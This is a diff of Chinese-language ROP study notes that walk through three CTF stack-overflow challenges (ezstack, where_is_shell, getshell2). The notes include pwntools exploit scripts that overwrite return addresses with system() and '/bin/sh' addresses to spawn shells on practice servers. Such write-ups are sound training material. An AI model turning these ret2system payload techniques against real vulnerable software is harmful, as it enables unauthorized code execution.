@@ -15,7 +15,11 @@ recommend: 10
 
 ---
 
-### 什么是ROP
+# ROP 学习笔记
+
+---
+
+## 什么是ROP
 
 > **为什么会诞生 ROP？（被逼出来的绝招）**
 >
@@ -48,7 +52,7 @@ recommend: 10
 
 ---
 
-### [NISACTF 2022]ezstack
+## [NISACTF 2022]ezstack
 
 比赛链接：https://www.nssctf.cn/problem/2057
 
@@ -58,7 +62,7 @@ recommend: 10
 
 ---
 
-#### NX保护
+### NX保护
 
 > **NX 保护 (No-eXecute)**
 > NX（在 Windows 中称为 DEP）针对的是**内存权限**。
@@ -83,7 +87,7 @@ payload = b'a'*72 + p32(system_addr)+p32(bin_addr)
 
 ---
 
-#### 32位系统下对system函数调用的不同区别
+### 32位系统下对system函数调用的不同区别
 
 动画:[HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[NISACTF 2022\]ezstack/p32位系统system_call不同区别payload不同用法.html · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[NISACTF 2022]ezstack/p32位系统system_call不同区别payload不同用法.html)
 
@@ -107,27 +111,25 @@ payload = b'a'*72 + p32(system_addr)+p32(bin_addr)
 
 ---
 
-#### Exploit 代码
+### Exploit 代码
 
 ```python
 from pwn import *
 r = process("./pwn")
-##r = remote("node5.anna.nssctf.cn",21304)
+#r = remote("node5.anna.nssctf.cn",21304)
 context(os='linux',arch='i386',log_level='debug')
 offset = 0x48+0x4
-##return_address = 0x08048503
+#return_address = 0x08048503
 system_address = 0x08048512
 bin_sh_address = 0x0804A024
 
 payload = b'a'*offset+p32(system_address)+p32(bin_sh_address)
-##gdb.attach(r)
+#gdb.attach(r)
 r.sendline(payload)
 r.interactive()
 ```
 
----
-
-### [GFCTF 2021]where_is_shell
+[GFCTF 2021]where_is_shell
 
 题目连接:https://www.nssctf.cn/problem/889
 
@@ -147,7 +149,7 @@ r.interactive()
 
 ---
 
-#### 垫片ret
+### 垫片ret
 
 [栈对齐动画](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[SWPUCTF 2021 新生赛]gift_pwn/PWN 栈对齐.html)
 
@@ -156,7 +158,7 @@ r.interactive()
 
 ---
 
-#### 不同system_call的区别(64位)
+### 不同system_call的区别(64位)
 
 - **形态一：跳向代码段的 `call _system`**
   - 底层原理：`call` 指令硬件级微操是 `push rip; jmp`。
@@ -174,7 +176,7 @@ r.interactive()
 
 ---
 
-#### `$0` 的妙用
+### `$0` 的妙用
 
 还记得这张图片吗？
 ![image-20260429130046386](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185018129-1407487080.png)
@@ -186,7 +188,7 @@ r.interactive()
 
 ---
 
-#### pop rdi;ret 作用
+### pop rdi;ret 作用
 
 > **64位传参约定：**
 > 函数不再从栈上找参数，而是看寄存器。第一个参数必须放在 **`rdi`**。
@@ -198,14 +200,14 @@ r.interactive()
 
 ---
 
-#### Exploit 代码
+### Exploit 代码
 
 ```python
-## call _system 方式
+# call _system 方式
 from pwn import *
 context(os = 'linux', arch = 'amd64', log_level = 'debug')
 
-##r = process('./shell')
+#r = process('./shell')
 r = remote("node4.anna.nssctf.cn", 25607) 
 offset = 0x10+0x8
 pop_rdi_ret = 0x4005e3
@@ -218,7 +220,67 @@ r.sendline(payload)
 r.interactive()
 ```
 
-```md wrap
-<!-- 你可以在此处书写大纲，并在上方完成文章 -->
+## [WUSTCTF 2020]getshell2
+
+题目链接:https://www.nssctf.cn/problem/2003
+
+### 0x01 分析漏洞信息
+
+```bash
+checksec service
 ```
 
+![image-20260520131622461](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260520134139365-633416278.png)
+
+主函数main![image-20260520114320150](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260520134138943-1589718964.png)
+
+漏洞函数
+
+![image-20260520132015752](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260520134138606-1547595103.png)
+
+还找到了一个system函数地址
+
+![image-20260520132412875](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260520134138265-213800971.png)
+
+system -> 0x08048524
+
+
+
+::quote
+#icon
+(っ´ω`c)
+#default
+气死我了瞄，这题怎么放在了ret2syscall分类😡
+::
+
+---
+
+### 0x02 漏洞分析
+
+
+既然出现了system，那我们就找一个/bin/sh或者sh，因为栈不可执行，所以即使构造了/bin/sh也执行不了
+
+![image-20260520133809673](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260520134137372-584900942.png)
+
+在0x08048670找到了sh
+
+
+
+就这样构造吧
+
+```python
+from pwn import *
+
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+#r = process('./service')
+r = remote('node5.anna.nssctf.cn',23649)
+offset = 0x18+0x4
+system = 0x08048529
+bin_sh = 0x08048670
+payload = offset*b'a'+p32(system)+p32(bin_sh)
+
+r.sendline(payload)
+
+r.interactive()
+```
